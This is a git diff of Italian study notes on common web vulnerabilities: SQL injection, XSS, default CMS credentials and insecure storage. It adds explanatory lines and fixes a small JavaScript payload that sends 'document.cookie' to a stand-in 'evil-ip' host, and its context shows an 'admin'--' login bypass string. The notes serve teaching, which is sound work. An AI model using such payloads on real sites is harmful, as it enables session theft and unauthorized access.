@@ -22,6 +22,8 @@ user=admin'--
 ```
 > Si suppone che esista l'utente admin e che la logica del codice PHP restante implementi il login.
 ## 2. XSS - Cross site scripting
+É una vulnerabilitá che permette a un attaccante di manipolare un sito vulnerabile per far eseguire del codice Javascript malevolo ad un utente.
+
 Uno script può essere eseguito sul Browser della vittima, facendo in modo che i parametri del Browser relativi al sito target (in particolare I cookies) vengano intercettati.
 
 Si dividono in due categorie: 
@@ -46,7 +48,7 @@ Si puó inoltre allegare una richiesta a un file js di nostro possesso, mettere 
 ```
 ```js
 //pwn.js
-var i=new Image;
+var i=new Image();
 i.src="http://evil-ip:/?"+document.cookie;
 ```
 mettendo in ascolto un server HTTP per ricevere la richiesta.
@@ -71,6 +73,8 @@ Ad esempio:
 1. Il framework di sviluppo non è aggiornato
 2. Installo un pacchetto lato server ma non cambio gli utenti di default (es. user admin, password admin)
 3. Directory listing in Apache
+### Esempio: CSM con credenziali di default
+Un sito gestito tramite CMS(_Content Management_ System), come ad esempio wordpress o drupal, presenta le credenziali di default o un file di configurazione con le credenziali in chiaro
 ## 7. Insecure cryptographic storage
 Ad esempio:
 - Dati riservati sono memorizzati in chiaro, oppure la chiave è memorizzata in chiaro, sul server o sui backup
